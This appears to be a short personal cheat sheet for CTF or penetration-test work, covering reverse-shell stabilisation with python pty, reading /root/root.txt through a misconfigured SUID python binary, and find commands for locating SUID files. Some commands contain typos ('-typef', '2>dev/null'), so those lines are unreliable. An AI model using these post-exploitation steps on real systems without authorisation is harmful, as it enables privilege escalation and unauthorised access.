---
layout: default
title: "shells"
permalink: /shells/
---
# reverse shells

## stabilisation

>```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
followed by
```bash
python -c 'import os; os.system("/bin/bash")'
```
(shell still terminates with `Ctrl+C`)

```
The pty module defines operations for handling the pseudo-terminal concept: starting another process
and being able to write to and read from its controlling terminal programmatically.
```

## suids
If suid of python is misconfigured:

>/usr/bin/python : -rwsr-sr-x

can use
>```bash
$ python -c 'print(1+1)'
2
```
```bash
$ python -c 'print(open("/root/root.txt").read())'
```


finding such SUIDs

>```bash
find / -perm -u=s -typef 2>dev/null
```
_or_
```bash
find / -perm /4000 2>dev/null
```


